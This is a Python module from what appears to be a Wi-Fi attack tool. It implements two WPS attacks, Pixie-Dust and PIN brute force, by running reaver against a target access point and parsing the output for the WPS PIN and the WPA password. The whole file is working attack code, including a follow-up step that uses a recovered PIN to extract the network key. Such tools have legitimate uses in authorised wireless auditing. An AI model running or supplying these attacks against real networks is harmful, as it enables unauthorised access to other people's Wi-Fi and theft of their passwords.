"""WPS attacks: Pixie-Dust (offline) and PIN bruteforce (reaver)."""

from __future__ import annotations

import re

from anywifi.attacks.base import Attack
from anywifi.config import WPS_PIXIE_TIMEOUT
from anywifi.model import AttackContext, AttackResult, Network

_PSK_RE = re.compile(r"WPA PSK:\s*['\"]?(.+?)['\"]?\s*$", re.MULTILINE)
_PIN_RE = re.compile(r"WPS PIN:\s*['\"]?(\d{4,8})['\"]?")

_WPS_ENC = {"WPA", "WPA2", "WPA2/WPA3"}


def _parse_reaver(output: str):
    """Return (pin, psk) parsed from reaver output."""
    pin = _PIN_RE.search(output)
    psk = _PSK_RE.search(output)
    return (pin.group(1) if pin else None, psk.group(1).strip() if psk else None)


class WpsPixieAttack(Attack):
    vector = "wps-pixie"
    label = "WPS Pixie-Dust (offline)"

    def applicable(self, net: Network) -> bool:
        return net.wps and net.encryption in _WPS_ENC

    def run(self, net: Network, ctx: AttackContext) -> AttackResult:
        runner = ctx.runner
        cmd = [
            "reaver", "-i", ctx.interface, "-b", net.bssid,
            "-c", str(net.channel), "-K", "1", "-N", "-vv",
        ]
        res = runner.run(cmd, timeout=WPS_PIXIE_TIMEOUT, capture=True)
        pin, psk = _parse_reaver(res.stdout + res.stderr)

        # Got the PIN but not the PSK → use the PIN to fetch the PSK
        if pin and not psk:
            res2 = runner.run(
                ["reaver", "-i", ctx.interface, "-b", net.bssid,
                 "-c", str(net.channel), "-p", pin, "-vv"],
                timeout=WPS_PIXIE_TIMEOUT, capture=True,
            )
            _, psk = _parse_reaver(res2.stdout + res2.stderr)

        if psk:
            msg = f"Pixie-Dust succeeded (PIN {pin})" if pin else "Pixie-Dust succeeded"
            return self._result(net, success=True, password=psk, message=msg)
        return self._result(net, success=False, message="Pixie-Dust failed")


class WpsPinAttack(Attack):
    vector = "wps-pin"
    label = "WPS PIN bruteforce"

    def applicable(self, net: Network) -> bool:
        return net.wps and net.encryption in _WPS_ENC

    def run(self, net: Network, ctx: AttackContext) -> AttackResult:
        runner = ctx.runner
        # Can take a long time; delayed to reduce lockouts. An upper bound is applied.
        cmd = [
            "reaver", "-i", ctx.interface, "-b", net.bssid,
            "-c", str(net.channel), "-vv", "-d", "2", "-T", "1",
        ]
        res = runner.run(cmd, timeout=WPS_PIXIE_TIMEOUT * 4, capture=True)
        pin, psk = _parse_reaver(res.stdout + res.stderr)
        if psk:
            return self._result(
                net, success=True, password=psk,
                message=f"PIN found ({pin})" if pin else "PIN bruteforce succeeded",
            )
        return self._result(
            net, success=False,
            message="PIN bruteforce failed (AP may be locked)",
        )
